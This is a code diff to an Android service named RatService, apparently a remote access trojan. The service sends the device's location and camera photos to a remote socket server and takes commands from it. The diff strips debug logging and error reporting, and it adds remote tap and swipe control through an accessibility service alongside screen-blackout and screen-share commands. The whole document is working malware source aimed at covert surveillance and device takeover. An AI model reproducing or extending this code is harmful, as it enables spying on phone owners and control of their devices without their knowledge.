@@ -31,14 +31,11 @@ public class RatService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.d(TAG, "Service created");
-
         deviceId = getDeviceId();
         startForeground(1, buildNotification());
 
         locationModule = new LocationModule(this, (lat, lon) -> {
             try {
-                Log.d(TAG, "Location: " + lat + "," + lon);
                 JSONObject resp = new JSONObject();
                 resp.put("id", deviceId);
                 resp.put("type", "location");
@@ -50,15 +47,12 @@ public class RatService extends Service {
 
         cameraModule = new CameraModule(this, base64 -> {
             try {
-                Log.d(TAG, "Camera captured len=" + base64.length());
                 JSONObject resp = new JSONObject();
                 resp.put("id", deviceId);
                 resp.put("type", "camera");
                 resp.put("image", base64);
                 if (socket != null && socket.connected()) socket.emit("response", resp);
-            } catch (Exception e) {
-                Log.e(TAG, "Cam send error", e);
-            }
+            } catch (Exception ignored) {}
         });
 
         connectSocket();
@@ -103,10 +97,6 @@ public class RatService extends Service {
                 } catch (Exception ignored) {}
             });
 
-            socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
-                Log.e(TAG, "Connect error: " + (args.length > 0 ? args[0].toString() : "?"));
-            });
-
             socket.on("execute", args -> {
                 try {
                     JSONObject cmd = (JSONObject) args[0];
@@ -130,15 +120,28 @@ public class RatService extends Service {
                 locationModule.getLocation();
                 break;
             case "camera":
-                boolean front = cmd.optBoolean("front", false);
-                Log.d(TAG, "Camera capture front=" + front);
-                cameraModule.capturePhoto(front);
+                cameraModule.capturePhoto(cmd.optBoolean("front", false));
+                break;
+            case "touch":
+                float x = (float) cmd.optDouble("x", 0);
+                float y = (float) cmd.optDouble("y", 0);
+                PrisAccessibility.performTap(x, y);
+                break;
+            case "swipe":
+                PrisAccessibility.performSwipe(
+                    (float) cmd.optDouble("x1", 0),
+                    (float) cmd.optDouble("y1", 0),
+                    (float) cmd.optDouble("x2", 0),
+                    (float) cmd.optDouble("y2", 0));
                 break;
             case "blackout":
                 startService(new Intent(this, OverlayService.class));
                 break;
             case "unblackout":
                 stopService(new Intent(this, OverlayService.class));
+                break;
+            case "stop_screen":
+                stopService(new Intent(this, ScreenShareService.class));
                 break;
         }
     }
